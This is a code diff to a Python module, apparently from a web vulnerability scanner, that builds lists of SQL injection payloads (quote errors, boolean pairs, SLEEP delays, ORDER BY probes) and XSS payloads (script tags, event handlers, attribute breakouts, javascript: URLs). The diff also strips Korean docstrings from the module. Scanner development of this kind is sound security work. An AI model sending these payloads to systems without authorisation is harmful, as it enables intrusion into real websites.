@@ -4,14 +4,12 @@ from typing import TypedDict
 
 
 class AttackRequest(TypedDict):
-    """변형기가 파라미터 값에 적용할 단일 공격 요청 템플릿."""
 
     set_id: str
     payload: str
 
 
 def _sqli_error_requests() -> list[AttackRequest]:
-    """SQL 문법 오류 유발 여부를 확인하는 Error-based SQLi 요청을 반환한다."""
 
     payloads = [
         "{value}'",
@@ -24,7 +22,6 @@ def _sqli_error_requests() -> list[AttackRequest]:
 
 
 def _sqli_boolean_requests() -> list[AttackRequest]:
-    """동일 번호의 true/false 요청을 한 쌍으로 비교할 수 있게 반환한다."""
 
     request_pairs = [
         (
@@ -60,12 +57,7 @@ def _sqli_boolean_requests() -> list[AttackRequest]:
 
 
 def _sqli_time_delay_requests(delay_seconds: int) -> list[AttackRequest]:
-    """원본 요청의 응답 시간과 비교할 Time-based SQLi 지연 요청을 반환한다.
-
-    원본 요청이 이미 기준 응답으로 전송되므로 SLEEP(0) 제어 요청과 동일한
-    지연 요청의 중복 retry 항목은 만들지 않는다.
-    """
-
+ 
     payloads = [
         f"{{value}}' AND SLEEP({delay_seconds})-- ",
         f'{{value}}" AND SLEEP({delay_seconds})-- ',
@@ -75,7 +67,6 @@ def _sqli_time_delay_requests(delay_seconds: int) -> list[AttackRequest]:
 
 
 def _sqli_order_by_requests(max_order_by: int) -> list[AttackRequest]:
-    """ORDER BY 1부터 max_order_by까지 세 가지 입력 형태로 반환한다."""
 
     payloads: list[str] = []
     for index in range(1, max_order_by + 1):
@@ -89,27 +80,58 @@ def _sqli_order_by_requests(max_order_by: int) -> list[AttackRequest]:
     return _numbered_requests("SQLI_order_by", payloads)
 
 
-def _xss_reflected_requests() -> list[AttackRequest]:
-    """브라우저에서 실행 가능한 Reflected XSS 공격문을 반환한다.
-
-    {token}은 변형기가 요청별 고유 문자열로 치환한다. 토큰은 단순 반사 여부만
-    확인하기 위한 독립 요청이 아니라, 실제 XSS 공격문이 응답에 반사되었는지
-    식별하기 위한 표식으로 사용한다.
-    """
+def _xss_script_requests() -> list[AttackRequest]:
 
     payloads = [
         "<script>alert('{token}')</script>",
-        '"><img src=x onerror=alert(\'{token}\')>',
-        "'><svg onload=alert(\"{token}\")>",
-        '" onmouseover=alert(\'{token}\') x="',
+        '<script>alert("{token}")</script>',
         "</textarea><script>alert('{token}')</script>",
         "</script><script>alert('{token}')</script>",
     ]
-    return _numbered_requests("XSS_reflected", payloads)
+    return _numbered_requests("XSS_script", payloads)
+
+
+def _xss_event_handler_requests() -> list[AttackRequest]:
+
+    payloads = [
+        "<img src=x onerror=alert('{token}')>",
+        "<svg onload=alert('{token}')>",
+        "<body onload=alert('{token}')>",
+        "<details open ontoggle=alert('{token}')>",
+    ]
+    return _numbered_requests("XSS_event_handler", payloads)
+
+
+def _xss_attribute_breakout_requests() -> list[AttackRequest]:
+
+    payloads = [
+        '" onmouseover=alert(\'{token}\') x="',
+        "' onmouseover=alert(\"{token}\") x='",
+        '"><img src=x onerror=alert(\'{token}\')>',
+        "'><svg onload=alert(\"{token}\")>",
+    ]
+    return _numbered_requests("XSS_attribute_breakout", payloads)
+
+
+def _xss_url_context_requests() -> list[AttackRequest]:
+
+    payloads = [
+        "javascript:alert('{token}')",
+        "JaVaScRiPt:alert('{token}')",
+        "data:text/html,<script>alert('{token}')</script>",
+    ]
+    return _numbered_requests("XSS_url_context", payloads)
+
+
+def _xss_escape_probe_requests() -> list[AttackRequest]:
+
+    payloads = [
+        'IBDS_XSS_ESC_{token}<>"\'&',
+    ]
+    return _numbered_requests("XSS_escape_probe", payloads)
 
 
 def _numbered_requests(prefix: str, payloads: list[str]) -> list[AttackRequest]:
-    """payload 순서대로 prefix_001 형식의 set_id를 부여한다."""
 
     return [
         {
@@ -127,20 +149,6 @@ def build_attack_request_list(
     include_sqli: bool = True,
     include_xss: bool = True,
 ) -> list[AttackRequest]:
-    """변형기가 사용할 공격 요청 목록만 반환한다.
-
-    입력:
-        max_order_by: 생성할 ORDER BY의 최대 열 번호.
-        delay_seconds: Time-based SQLi의 SLEEP 지연 시간.
-        include_sqli: SQLi 요청 포함 여부.
-        include_xss: XSS 요청 포함 여부.
-
-    출력:
-        set_id와 payload만 포함하는 평탄한 공격 요청 목록.
-
-    이 함수는 targets.json을 읽거나, 값을 치환하거나, HTTP 요청을 보내거나,
-    응답을 판정하지 않는다. 해당 작업은 변형기·주입기·탐지기의 책임이다.
-    """
 
     if include_sqli and max_order_by < 1:
         raise ValueError("max_order_by must be greater than or equal to 1")
@@ -156,6 +164,10 @@ def build_attack_request_list(
         requests.extend(_sqli_order_by_requests(max_order_by))
 
     if include_xss:
-        requests.extend(_xss_reflected_requests())
+        requests.extend(_xss_script_requests())
+        requests.extend(_xss_event_handler_requests())
+        requests.extend(_xss_attribute_breakout_requests())
+        requests.extend(_xss_url_context_requests())
+        requests.extend(_xss_escape_probe_requests())
 
     return requests
